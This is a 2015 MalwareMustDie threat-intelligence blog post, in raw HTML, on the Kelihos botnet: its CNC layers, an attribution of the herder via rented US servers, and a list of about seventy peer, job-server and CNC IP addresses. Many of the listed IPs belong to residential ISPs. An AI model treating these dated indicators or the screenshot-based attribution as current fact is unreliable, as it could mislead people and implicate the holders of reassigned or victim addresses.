[\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VZgN0NCX05o\/VnfIPkIfE4I\/AAAAAAAAT34\/fSdMBo8kC2g\/s3120\/kelispam02.png\"\u003Escript spam\u003C\/a\u003E] [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-m_HZ_LqkftY\/VnfIQLOevuI\/AAAAAAAAT4I\/O7y7jE8iUdE\/s4120\/kelispam04.PNG\"\u003Epay per click\u003C\/a\u003E] [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-VVnT-JB9O4E\/VnfIPs9XaPI\/AAAAAAAAT4A\/fhnlqvNL01U\/s4120\/kelispam01.PNG\"\u003Eregional targeted spam\u003C\/a\u003E] etc (\u003Ci\u003Emalware related spam can not be disclosed in here\u003C\/i\u003E).  \u003Cp\u003E\u003Cb\u003E\u003Ci\u003ETo be noted: \u003C\/i\u003E\u003C\/b\u003EThere are \u003Ci\u003Etop central operation servers\u003C\/i\u003E which the herder operated separately and unlisted to the checks. Thus,the botnet is never involving CNC layer or upper layer directly to the distributional layer of the payload, but passing the \"delivery\" to the infected proxy peers (read: DHCP\/ADSL infected PC connected to the internet behind the routers) which makes harder to proof its maliciousness, even though these upper layers nodes are having a very important role in steer \u003Ci\u003Emalicious activity\u003C\/i\u003E in the infected peers.  \u003Cp\u003E\u003Ci\u003EThe checking scheme of the botnet peers\u003C\/i\u003E is where actually the vector we used to dig up the connection to the source of the threat, so I will not have to disclose the domains, payloads, encryption, campaigns or other opsec related work details.  \u003Cp\u003E\u003Ch2\u003EThe Kelihos CNC in AS19318(US) at YYYYY(censored)\u003C\/h2\u003E \u003Cp\u003EInside of the category of \u003Cb\u003E(3)\u003C\/b\u003E stated in above section, it was spotted CNC IP listed as per checked in a scheme below: \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2uuFNz1azdo\/Vnev7IKyzpI\/AAAAAAAAT24\/x2dfKc1m4ZA\/s3120\/1001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2uuFNz1azdo\/Vnev7IKyzpI\/AAAAAAAAT24\/x2dfKc1m4ZA\/s580\/1001.png\u003E\u003C\/a\u003E \u003Cp\u003EThese are the IP registered to these two dedicated hosts: \u003Ci\u003E\u003Cb\u003Edsys417.server-1.biz\u003C\/b\u003E\u003C\/i\u003E and \u003Cb\u003E\u003Ci\u003Edsys418.server-1.biz\u003C\/i\u003E\u003C\/b\u003E as per checked below, physically located in \u003Ci\u003ENew Jersey, United States\u003C\/i\u003E. \u003Cpre class=\"brush: asm\"\u003E{ \"ip\": \"206.72.206.74-78\",\u003Cbr \/\u003E  \"hostname\": \"dsys418.server-1.biz\",\u003Cbr \/\u003E  \"ip\": \"66.45.241.130-134\",\u003Cbr \/\u003E  \"hostname\": \"dsys417.server-1.biz\",\u003Cbr \/\u003E  \"city\": \"Secaucus\",\u003Cbr \/\u003E  \"region\": \"New Jersey\",\u003Cbr \/\u003E  \"country\": \"US\",\u003Cbr \/\u003E  \"loc\": \"40.7895,-74.0565\",\u003Cbr \/\u003E  \"org\": \"AS19318 NEW JERSEY INTERNATIONAL INTERNET EXCHANGE LLC\",\u003Cbr \/\u003E  \"postal\": \"07094\" }\u003C\/pre\u003E The data above in form of textual per prefix\/routes networking used: \u003Cpre class=\"brush: asm\"\u003E66.45.241.130|dsys417.server-1.biz.|19318 | 66.45.224.0\/19 | (censored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.131||19318 | 66.45.224.0\/19 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.132||19318 | 66.45.224.0\/19 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.133||19318 | 66.45.224.0\/19 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.134||19318 | 66.45.224.0\/19 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.74|dsys418.server-1.biz|19318 | 206.72.192.0\/20 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.75||19318 | 206.72.192.0\/20 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.76||19318 | 206.72.192.0\/20 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.77||19318 | 206.72.192.0\/20 | (cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.78||19318 | 206.72.192.0\/20 | (cencored) | US | interserver.net | Interserver Inc\u003C\/pre\u003E \u003Cp\u003EThe checks are so important for these IPs on its two hosts, that the herder is running it in frequency of average 16 times per hour, in hourly basis, for each host, by using the remote API provided by the \u003Ci\u003EFUD check service \u003C\/i\u003Efor the purpose. As evidence I snipped a small portion as below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-CkPKqnva-Kk\/Vnez0WNuGGI\/AAAAAAAAT3E\/ik-ymZgN-ho\/s3120\/1002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-CkPKqnva-Kk\/Vnez0WNuGGI\/AAAAAAAAT3E\/ik-ymZgN-ho\/s580\/1002.png\u003E\u003C\/a\u003E \u003Cp\u003ETo proof the \u003Ci\u003Esolidity of the data \u003C\/i\u003Epresented, this original picture shows many authentic details:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-sfdBPjXWwVQ\/VnfJuP0T0hI\/AAAAAAAAT4k\/KWcNHF02YQE\/s4120\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sfdBPjXWwVQ\/VnfJuP0T0hI\/AAAAAAAAT4k\/KWcNHF02YQE\/s580\/004.png\u003E\u003C\/a\u003E \u003Cp\u003ESince the front end has payment records captured, it's not that difficult to know that \u003Ci\u003Ethe herder \u003C\/i\u003Ewant to keep on doing this at least until the early of this December 2015 [\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Wx4rlggnrGc\/VnfKmmwOMWI\/AAAAAAAAT4s\/IP2C6jBOU7Q\/s5120\/005.png\"\u003Elink\u003C\/a\u003E]  \u003Cp\u003EI think up to this point we are all agreed about the US basis 10(ten) IP addresses above are specifically checked by the \u003Ci\u003Ekelihos herder\u003C\/i\u003E for its \u003Ci\u003EFUD \u003C\/i\u003Epurpose, together with executable binaries of the botnet, the script saved in HTML files in the peers and other minor matters.\u003Cbr\u003EBut then questions raised up: \u003Ci\u003EWho owns those IPs? How can \u003Ci\u003EKelihos botnet herder\u003C\/i\u003E get the US IP addresses from the first place? Is HE the same person as we announced in 2013?\u003C\/i\u003E\u003Cbr\u003EThe next section will be the disclosure of all the questions above plus the ownership information.  \u003Cp\u003E\u003Ch2\u003EThe herder data dug from these 10 IP\u003C\/h2\u003E \u003Cp\u003EBefore I went to BotConf in 2013, we (MalwareMustDie operations in Germany and Netherland) launched effort [\u003Ca href=\"https:\/\/www.youtube.com\/watch?v=8GkECnNNQTM\"\u003Elink\u003C\/a\u003E] [\u003Ca href=\"https:\/\/www.youtube.com\/watch?v=E0nj70QmQEI\"\u003Elink\u003C\/a\u003E] and we \"paralized\" their payload scheme↓ too -  \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/hashtag\/MalwareMustDie?src=hash\"\u003E#MalwareMustDie\u003C\/a\u003E - \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Kelihos?src=hash\"\u003E#Kelihos\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Botnet?src=hash\"\u003E#Botnet\u003C\/a\u003E is Paralyzed now, snapshot 1 Russian infected IP is ZERO (pic) \u003Ca href=\"https:\/\/twitter.com\/hashtag\/MoronzISCryingHard?src=hash\"\u003E#MoronzISCryingHard\u003C\/a\u003E \u003Ca href=\"http:\/\/t.co\/15NLbYzCJw\"\u003Epic.twitter.com\/15NLbYzCJw\u003C\/a\u003E\u003C\/p\u003EMalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/407550545918824448\"\u003EDecember 2, 2013\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E..and we stop the payload of Kelihos for some days, and with the help from good fellows from \u003Ci\u003E\u003Cb\u003EMcAfee\u003C\/b\u003E\u003C\/i\u003E and \u003Ci\u003E\u003Cb\u003ELeaseWeb \u003C\/b\u003E\u003C\/i\u003Etogether we took down dedicated servers that was used to run as \u003Ci\u003EKelihos mother ships\u003C\/i\u003E (You will see some video about that in 2013's link above). It was taking down Kelihos like 5 days without payloads, and successfully PoC some evidence of the botnet with \u003Ci\u003Edisrupting \u003C\/i\u003Ethe herder at the same time.  \u003Cp\u003EIt won't take long for the herder to quickly revive the botnet. And that was the time when the 10 IP described above was born. During the reviving period \u003Ci\u003Ethe bot herder \u003C\/i\u003Ewas renting two dedicated servers from \"regname.biz (owner of server-1.biz)\" via QQQQQQ(cencored) service, and \u003Cb\u003E\u003Ci\u003Ethere is an evidence\u003C\/i\u003E\u003C\/b\u003E of payment request from the service to the herder and it \u003Cb\u003E\u003Ci\u003Elooks like\u003C\/i\u003E\u003C\/b\u003E this:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-UQQjCzqaA0M\/VnfVEZ-3AKI\/AAAAAAAAT48\/rfcLK9CbJYY\/s4120\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-UQQjCzqaA0M\/VnfVEZ-3AKI\/AAAAAAAAT48\/rfcLK9CbJYY\/s580\/006.png\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg-----\u003E\u003Cbr\u003EIf you are making an account of any \u003Ci\u003Ehoster service\u003C\/i\u003E, for them to contact you it will be needed the XXXXX(censored) data of yours. Apparently the XXXXX(censored) data used for contact communication in arranging these servers is matched to the XXXXX(censored) data registered as contact information in the \u003Ci\u003EFUD check system\u003C\/i\u003E described above [\u003Ca href=\"https:\/\/lh5.googleusercontent.com\/-SCAoFk9jfCU\/UqcMowPaO-I\/AAAAAAAAN5g\/6ByHKMcDS9s\/s920\/Screen%2520Shot%25202013-12-10%2520at%25208.46.49%2520PM.png\"\u003Elink\u003C\/a\u003E] that is connected to his main CNC for binary checking.  \u003Cp\u003E\u003Ci\u003EWell, okay, \u003Cb\u003Ewhat is the proof \u003C\/b\u003Ethat \u003Cb\u003E\u003Ci\u003Ethe 10 IP addresses are owned by\u003C\/i\u003E\u003C\/b\u003E a person who is using XXXXX(censored) data too?\u003C\/i\u003E \u003Cbr\u003ELet's see the explanation below...  \u003Cp\u003EUnder a good legit cooperation the picture of the herder's \u003Cb\u003Erented dedicated server details\u003C\/b\u003E in the XXXX(cencored) account can be achieved, in this \"service\"..in the billing history, the invoices shown in the last two transaction of renting servers are the first initiation payment done by the herder, as per seen in the previous data, \u003Cb\u003Esee the invoice number\u003C\/b\u003E and the contents which will be matched to what the payment request document also stated.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-GBzB9WzEEYk\/VngEJhY6cQI\/AAAAAAAAT6U\/6-1uJRZucHA\/s5120\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-GBzB9WzEEYk\/VngEJhY6cQI\/AAAAAAAAT6U\/6-1uJRZucHA\/s580\/007.png\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg----\u003E \u003Cp\u003EThe two dedicated servers are keeping on renewal until at the time I wrote this post, one would find this evidence in the recent details like below in the system:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-qisC-BEWYVw\/Vnfb-kmr1ZI\/AAAAAAAAT5U\/XgObwdMl71g\/s4120\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-qisC-BEWYVw\/Vnfb-kmr1ZI\/AAAAAAAAT5U\/XgObwdMl71g\/s580\/008.png\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg----\u003E \u003Cp\u003EAnd these 10 IP addresses are the IP addresses of what two hosts are serving. Even though hoster's secure system need to hover mouse\/pointer to see these details, one can make the screenshot as per below to managed captured data as proof, ..aaaand \u003Ci\u003E\u003Cb\u003EW000T! W000T! \u003C\/b\u003E\u003C\/i\u003Ethese two hosts are the ones responsible to the 10 IP addresses in United states that was used by kelihos herder, under the same XXXXX(censored) contact account, which is obviously belong to the \u003Cb\u003E\u003Ci\u003Ekelihos botnet herder\u003C\/i\u003E\u003C\/b\u003E.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-ye9p77JYY8E\/Vnfb-xfVQnI\/AAAAAAAAT5Q\/QWqIASxMEpc\/s4120\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-ye9p77JYY8E\/Vnfb-xfVQnI\/AAAAAAAAT5Q\/QWqIASxMEpc\/s580\/009.png\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg----\u003E \u003Cp\u003EAs per every online basis system, the profile setting part is exists, and beyond any doubt one can see the same XXXXX(censored) data is used, while accessing that part :-)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-O2Fgz80dhu0\/VngVPfba_kI\/AAAAAAAAT6w\/B0nPYRVvfKs\/s5120\/014.PNG\"\u003E\u003Comg src=https:\/\/lh3.googleusercontent.com\/-O2Fgz80dhu0\/VngVPfba_kI\/AAAAAAAAT6w\/B0nPYRVvfKs\/s580\/014.PNG\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg----\u003E \u003Cp\u003E\u003Ch2\u003EWho's is this herder? Not the same guy?\u003C\/h2\u003E \u003Cp\u003EIt is proven by this vector too that the herder is having the same ID that we, MalwareMustDie, presented in \u003Cb\u003EBotConf in 2013\u003C\/b\u003E, unless you can say that this bot herder is sharing the XXXXX(censored) data that is used to arrange dedicated servers of more than 15 IPs of CNC..and to check the FUD of the malware payload+IP ..to a common good public citizen that is \"innocently\" use the same XXXXX(censored) dara, without being worry this \"innocent man\" will go to police to report all of the herder's crime.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-F-WTX6hxalw\/Vnfg7hEjyKI\/AAAAAAAAT5s\/FuTTmgzWMZM\/s4120\/010.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-F-WTX6hxalw\/Vnfg7hEjyKI\/AAAAAAAAT5s\/FuTTmgzWMZM\/s580\/010.png\u003E\u003C\/a\u003E\u003C!----img src=https:\/\/lh4.googleusercontent.com\/-6pYWppi3INc\/UqdWWMgoESI\/AAAAAAAAN7k\/hrOYKI6Ih_8\/s395\/B1001100100.jpg----\u003E\u003Cbr\u003EAnd we thank you to the \u003Ci\u003E\u003Cb\u003EShell Club Smart Russia database \u003C\/b\u003E\u003C\/i\u003E to help us in pointing the correct identification and location via (XXXXX\/censored) data of the person who is responsible of Kelihos \u003Ci\u003Emalicious services\u003C\/i\u003E like: malicious redirect, clickfraud, spams and malware infections behind the botnet. From this point it's the law enforcement matter to conduct the cyber crime investigation further.  \u003Cp\u003E\u003Ch2\u003EThe VERY important P2P peers IP, job servers IP and CNC IP of Kelihos\u003C\/h2\u003E \u003Cp\u003EThis is actually the most important part. Below is the list of the \u003Ci\u003EKelihos upper infrastructure layer\u003C\/i\u003E. I will not openly explain which IP is doing what. But for the safeness of our internet we suggest you strongly to neutralize the listed hosts and block them during the process. The 10 IP addresses listed above is included in the list. The list is sorted one since 2013 until today. An IOC to share the list to each entities would be nice follow for this post. And if you need to have the historical basis data please contact us, with sending message in the comment as usual with stated yourself+entity email address. PS: There are many data can be shared to law enforcement only. \u003Cpre class=\"brush: asm\"\u003E109.87.199.28|28.199.87.109.triolan.net.|13188 | 109.87.199.0\/24 | BANKINFORM | UA | triolan.net | Content Delivery Network Ltd\u003Cbr \/\u003E118.160.178.92|118-160-178-92.dynamic.hinet.net.|3462 | 118.160.0.0\/16 | HINET | TW | hinet.net | Data Communication Business Group\u003Cbr \/\u003E121.52.159.143|free-iub.edu.pk.|45773 | 121.52.159.0\/24 | HECPERN-AS | PK | pern.pk | Pern-Pakistan Education \u0026 Research Network is an\u003Cbr \/\u003E126.48.37.45|softbank126048037045.bbtec.net.|17676 | 126.48.0.0\/16 | GIGAINFRA | JP | softbankbb.co.jp | Japan Nation-Wide Network Of SoftBank BB Corp.\u003Cbr \/\u003E151.0.40.22||45025 | 151.0.40.0\/21 | EDN | UA | lir.net.ua | Online Technologies LTD\u003Cbr \/\u003E159.224.159.161|161.159.224.159.triolan.net.|13188 | 159.224.158.0\/23 | BANKINFORM | UA | triolan.net | Content Delivery Network Ltd\u003Cbr \/\u003E175.209.240.53||4766 | 175.208.0.0\/13 | KIXS-AS | KR | kt.com | Korea Telecom\u003Cbr \/\u003E176.103.48.27||48031 | 176.103.48.0\/20 | XSERVER-IP-NETWORK | UA | brindirect.com | PE Ivanov Vitaliy Sergeevich\u003Cbr \/\u003E176.103.54.73||48031 | 176.103.48.0\/20 | XSERVER-IP-NETWORK | UA | brindirect.com | PE Ivanov Vitaliy Sergeevich\u003Cbr \/\u003E176.103.55.73||48031 | 176.103.48.0\/20 | XSERVER-IP-NETWORK | UA | brindirect.com | PE Ivanov Vitaliy Sergeevich\u003Cbr \/\u003E176.61.167.245|cable-korisnici-Lukavac-245.167.61.176.BHB.BA.|57397 | 176.61.167.0\/24 | BHB-CABLE-TV-BIH | AT | jm-data.at | JM-DATA GmbH\u003Cbr \/\u003E176.73.239.93||16010 | 176.73.128.0\/17 | CAUCASUSONLINEAS | GE | caucasus.net | Caucasus Online Ltd.\u003Cbr \/\u003E176.73.248.151||16010 | 176.73.128.0\/17 | CAUCASUSONLINEAS | GE | caucasus.net | Caucasus Online Ltd.\u003Cbr \/\u003E176.8.113.143|176-8-113-143-broadband.kyivstar.net.|15895 | 176.8.0.0\/16 | KSNET | UA | kyivstar.ua | Kyivstar PJSC\u003Cbr \/\u003E176.8.70.239|176-8-70-239-lzv.broadband.kyivstar.net.|15895 | 176.8.0.0\/16 | KSNET | UA | kyivstar.ua | Kyivstar PJSC\u003Cbr \/\u003E178.137.29.163|178-137-29-163-broadband.kyivstar.net.|15895 | 178.137.0.0\/16 | KSNET | UA | kyivstar.ua | Kyivstar PJSC\u003Cbr \/\u003E178.54.39.16|unallocated.sta.synapse.net.ua.|29107 | 178.54.0.0\/17 | SYNAPSE | UA | synapse.net.ua | Open JSC Stock Company Sater\u003Cbr \/\u003E186.115.146.227||3816 | 186.115.144.0\/21 | COLOMBIA | CO | - | Rapidotolima\u003Cbr \/\u003E186.34.172.184||6535 | 186.34.0.0\/16 | Telmex | CL | telmex.com | Telmex Chile S.A HFC\u003Cbr \/\u003E188.138.227.43|188-138-227-43.starnet.md.|31252 | 188.138.128.0\/17 | STARNET | MD | starnet.md | StarNet S.R.L\u003Cbr \/\u003E193.126.181.18||2860 | 193.126.0.0\/16 | NOS_COMUNICACOES | PT | nos.pt | Nos Comunicacoes S.A.\u003Cbr \/\u003E193.203.51.47||48031 | 193.203.48.0\/22 | XSERVER-IP-NETWORK | UA | brindirect.com | PE Ivanov Vitaliy Sergeevich\u003Cbr \/\u003E193.28.179.38|hostby.isp4you.cz.|58146 | 193.28.179.0\/24 | SVOD | RU | - | Svod ltd.\u003Cbr \/\u003E193.28.179.39|hostby.isp4you.cz.|58146 | 193.28.179.0\/24 | SVOD | RU | - | Svod ltd.\u003Cbr \/\u003E193.28.179.40|hostby.isp4you.cz.|58146 | 193.28.179.0\/24 | SVOD | RU | - | Svod ltd.\u003Cbr \/\u003E194.146.199.200||21261 | 194.146.196.0\/22 | STELS | UA | nadolinskiy.dn.ua | Stels ISP Ltd\u003Cbr \/\u003E195.140.160.46||48964 | 195.140.160.0\/22 | ENTERRA | UA | abcname.net | Datasfera LTD\u003Cbr \/\u003E195.18.14.96||196638 | 195.18.12.0\/22 | PROMTELECOM | UA | promtele.com | OJSC Promtelecom\u003Cbr \/\u003E196.218.187.142|host-196.218.187.142-static.tedata.net.|8452 | 196.218.0.0\/16 | TE | EG | tedata.net | TE Data\u003Cbr \/\u003E201.187.15.184||14117 | 201.187.0.0\/20 | Telefonica | CL | telsur.cl | Telefonica del Sur S.A.\u003Cbr \/\u003E201.219.169.169|vm-customer-201-219-169-169.megacable.com.ar.|28015 | 201.219.169.0\/24 | MERCO | AR | megacable.com.ar | Merco Comunicaciones\u003Cbr \/\u003E206.72.206.74||19318 | 206.72.192.0\/20 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.75||19318 | 206.72.192.0\/20 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.76||19318 | 206.72.192.0\/20 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.77||19318 | 206.72.192.0\/20 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E206.72.206.78||19318 | 206.72.192.0\/20 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E211.120.158.247|zaqd3789ef7.zaq.ne.jp.|9617 | 211.120.128.0\/19 | ZAQ | JP | jcom.co.jp | J:COM West Co. Ltd.\u003Cbr \/\u003E212.55.75.70|212-55-75-70.dynamic-pool.kanev.mclaut.net.|25133 | 212.55.74.0\/23 | MCLAUT | UA | mclaut.in.ua | LLC Mclaut-Invest\u003Cbr \/\u003E213.111.223.250|250.223-pool.nikopol.net.|44924 | 213.111.192.0\/18 | MAINSTREAM | UA | nikopol.net | PP MainStream\u003Cbr \/\u003E219.124.22.175|c022175.net219124.cablenet.ne.jp.|9378 | 219.124.16.0\/21 | CABLENET | JP | cablenet.ne.jp | Jcom Kawaguchitoda Co. Ltd.\u003Cbr \/\u003E31.131.122.246|cl122-246.dhcp.multinet.ua.|41871 | 31.131.112.0\/20 | RTL | UA | multinet.ua | Locom LLC\u003Cbr \/\u003E37.1.200.161||50673 | 37.1.200.0\/21 | SERVERIUS | NL | 3nt.com | 3nt solutions LLP\u003Cbr \/\u003E37.1.202.195||50673 | 37.1.200.0\/21 | SERVERIUS | NL | 3nt.com | 3nt solutions LLP\u003Cbr \/\u003E37.1.203.237||50673 | 37.1.200.0\/21 | SERVERIUS | NL | 3nt.com | 3nt solutions LLP\u003Cbr \/\u003E37.229.178.56|37-229-178-56-broadband.kyivstar.net.|15895 | 37.229.0.0\/16 | KSNET | UA | kyivstar.ua | Kyivstar PJSC\u003Cbr \/\u003E46.118.63.149|SOL-FTTB.149.63.118.46.sovam.net.ua.|15895 | 46.118.0.0\/15 | KSNET | UA | golden-telecom.com | Golden Telecom\u003Cbr \/\u003E46.160.115.217|46.160.115.217.format-tv.net.|6712 | 46.160.114.0\/23 | FORMAT-TV | UA | maxnet.ua | Maxnet Telecom Ltd\u003Cbr \/\u003E46.219.55.66|46.219.55.66.freenet.com.ua.|31148 | 46.219.55.0\/24 | FREENET | UA | freenet.com.ua | Freenet Ltd.\u003Cbr \/\u003E46.63.32.75|pool-46-63-32-75.x-city.ua.|51784 | 46.63.32.0\/21 | X-CITY | UA | x-city.ua | X-City Ltd.\u003Cbr \/\u003E5.105.56.87|5-105-56-87.mytrinity.com.ua.|43554 | 5.105.0.0\/16 | CDS | UA | mytrinity.com.ua | Cifrovye Dispetcherskie Sistemy\u003Cbr \/\u003E5.178.184.197||28751 | 5.178.128.0\/18 | CAUCASUS-NET | GE | caucasus.net | Caucasus Online Ltd.\u003Cbr \/\u003E5.248.243.45|5-248-243-45-broadband.kyivstar.net.|15895 | 5.248.0.0\/16 | KSNET | UA | kyivstar.ua | Kyivstar PJSC\u003Cbr \/\u003E66.45.241.130|dsys417.server-1.biz.|19318 | 66.45.224.0\/19 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.131||19318 | 66.45.224.0\/19 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.132||19318 | 66.45.224.0\/19 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.133||19318 | 66.45.224.0\/19 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E66.45.241.134||19318 | 66.45.224.0\/19 | XXXX(cencored) | US | interserver.net | Interserver Inc\u003Cbr \/\u003E77.109.23.44|77-109-23-44.dynamic.peoplenet.ua.|42396 | 77.109.20.0\/22 | PPLNETUA | UA | 3gmobile.com.ua | PJSC Telesystems of Ukraine\u003Cbr \/\u003E77.121.44.40|dhcp-pool.net-77.121.44.host-40.sev.sevcable.net.|35680 | 77.121.32.0\/19 | LINIATEL | UA | volia.net | Kyivski Telekomunikatsiyni Merezhi LLC\u003Cbr \/\u003E77.121.86.143|77-121-86-143.dynamic.kits.zp.ua.|25229 | 77.121.80.0\/21 | VOLIA | UA | volia.net | Kyivski Telekomunikatsiyni Merezhi LLC\u003Cbr \/\u003E77.122.234.122|dynamic-77-122-234-122.ricona.net.ua.|25229 | 77.122.192.0\/18 | VOLIA | UA | volia.net | Kyivski Telekomunikatsiyni Merezhi LLC\u003Cbr \/\u003E82.79.127.7|82-79-127-7.alexandria.rdsnet.ro.|8708 | 82.76.0.0\/14 | RCS | RO | rdsnet.ro | RCS \u0026 RDS Business\u003Cbr \/\u003E89.137.97.166||6830 | 89.137.0.0\/16 | LGI | AT | upcnet.ro | UPC Romania CLUJ-NAPOCA\u003Cbr \/\u003E89.185.30.21|CPE257021.tvcom.net.ua.|34092 | 89.185.24.0\/21 | TVCOM | UA | tvcom.net.ua | TVCOM Ltd.\u003Cbr \/\u003E89.35.41.171|host-static-89-35-41-171.moldtelecom.md.|8926 | 89.35.40.0\/21 | MOLDTELECOM | MD | moldtelecom.md | Societatea pe Actiuni Moldtelecom\u003Cbr \/\u003E89.41.38.24|24.38.41.89.panevo.ro.|35421 | 89.41.36.0\/22 | PANELECTRO | RO | panevo.ro | SC Pan Electro SRL\u003Cbr \/\u003E93.177.178.40|host-93-177-178-40.customer.co.ge.|28751 | 93.177.160.0\/19 | CAUCASUS-NET | GE | caucasus.net | Caucasus Online Ltd.\u003Cbr \/\u003E94.176.116.122|122.116.176.94.globnet.md.|48331 | 94.176.116.0\/24 | GLOBNET | RO | globnet.md | S.C. Globnet S.R.L.\u003Cbr \/\u003E94.240.163.235||41232 | 94.240.160.0\/19 | SSN | UA | flagman.zp.ua | TOV Flagman Telecom\u003Cbr \/\u003E94.76.78.20|94.76.78.20.freenet.com.ua.|31148 | 94.76.78.0\/24 | FREENET | UA | freenet.com.ua | Freenet Ltd.\u003Cbr \/\u003E95.26.143.146|95-26-143-146.broadband.corbina.ru.|8402 | 95.26.0.0\/15 | CORBINA | RU | beeline.ru | Beeline Broadband\u003Cbr \/\u003E95.65.55.6|95-65-55-6.starnet.md.|31252 | 95.65.0.0\/17 | STARNET | MD | starnet.md | StarNet S.R.L\u003Cbr \/\u003E\u003C\/pre\u003EThe snip of recent checked important IP addresses (in historical):\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-kPFxqEpKyMg\/VngHFgApLzI\/AAAAAAAAT6g\/KZ_5nuIipQU\/s5120\/013.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-kPFxqEpKyMg\/VngHFgApLzI\/AAAAAAAAT6g\/KZ_5nuIipQU\/s580\/013.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EFollow up\u003C\/h2\u003E \u003Cp\u003EWith the good help from friends in EmergingThreat, the herder can kiss his botnet CNC traffic to its peers a goodbye from now on.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Umf4N9dOJWk\/VnkHatLM75I\/AAAAAAAAT7A\/GulxdDSW7Dg\/s4117\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Umf4N9dOJWk\/VnkHatLM75I\/AAAAAAAAT7A\/GulxdDSW7Dg\/s580\/002.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EEpilogue\u003C\/h2\u003E \u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u0026#10;\u0026quot;Whatever the LORD pleases, He does, In heaven and in earth, in the seas and in all deeps.\u0026quot;                    Psalm 135:6\u003C\/p\u003EMalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/678805686071902209\"\u003EDecember 21, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E 